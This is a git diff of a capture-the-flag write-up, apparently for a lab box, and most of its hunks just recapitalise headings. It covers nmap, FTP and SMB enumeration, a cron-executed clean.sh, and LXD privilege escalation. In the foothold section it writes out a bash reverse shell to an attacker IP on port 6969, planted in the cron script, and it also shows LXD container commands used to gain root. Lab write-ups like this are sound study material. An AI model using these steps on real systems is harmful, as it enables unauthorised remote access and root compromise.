@@ -1,4 +1,4 @@
-# recon
+# Recon
 Like always, start with nmap. I use my own tool to automate nmap scan, check it out [pymap](https://github.com/gu2rks/pymap)
 ```console
 $ python3 pymap.py -t $IP
@@ -10,7 +10,7 @@ it took 20 sec with the tool. sum up, 4 open ports:
 - 139/tcp open  netbios-ssn
 - 445/tcp open  microsoft-ds
   - samba file share
-## ftp
+## FTP
 connect to ftp server and get everything we can. we will examine it later.
 ```
 ftp> ls -la
@@ -22,7 +22,7 @@ drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
 -rw-rw-r--    1 1000     1000         2021 Aug 08 14:48 removed_files.log
 -rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
 ```
-## smb
+## SMB
 now let use `pymap.py` again to enumerate for smb
 ```console
 kali@kali:~/script$ sudo python3 pymap.py -t $IP -smb
@@ -86,7 +86,7 @@ smb: \> ls
 smb: \> 
 ```
 
-## examining all files from ftp and smb
+## Examining all files from ftp and smb
 ther are two pictures on smb, *corgo2.jpg* and *puppos.jpeg*. I used `exiftool` to check metadata and `hexeiditor` to look for weird hex patterns. Unfortunately, I can find anything.. to be save, I use `stegocracker` to crack them while I start examining files from `ftp`
 
 from ftp, we got 3 files
@@ -130,7 +130,9 @@ At this point, I assume that there is a cronjob that keep execute `clean.sh` sin
 
 Bingo! my assumtion is correct. as you can se the last modified time on `removed_files.log` changed from **14.43** to **14.44**. This prof that there is a cronjob that execute `clean.sh` each minute
 
-# foot hold
+
+At this point, I stop `stegcracker` 
+# Foot hold
 To get the foothold on the victim server, we will modify `clean.sh` by adding a reverse shell payload. Thereafter we will put the script a back to victim server and wait for cronjob to execute it.
 
 add ```bash -i >& /dev/tcp/<kali ip>/6969 0>&1``` to the script. it should now look like this 
@@ -214,7 +216,7 @@ If this is your first time running LXD on this machine, you should also run: lxd
 To start your first container, try: lxc launch ubuntu:18.04
 ```
 seem like we need to run lxd is not created yet. let run `lxd init` and press enter for everything (create with defualt setting). now we gonna create container -> device as root. then spawn a shell to gain root privilage!!
-```
+```console
 $ lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
 lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
 Error: Image with same fingerprint already exists
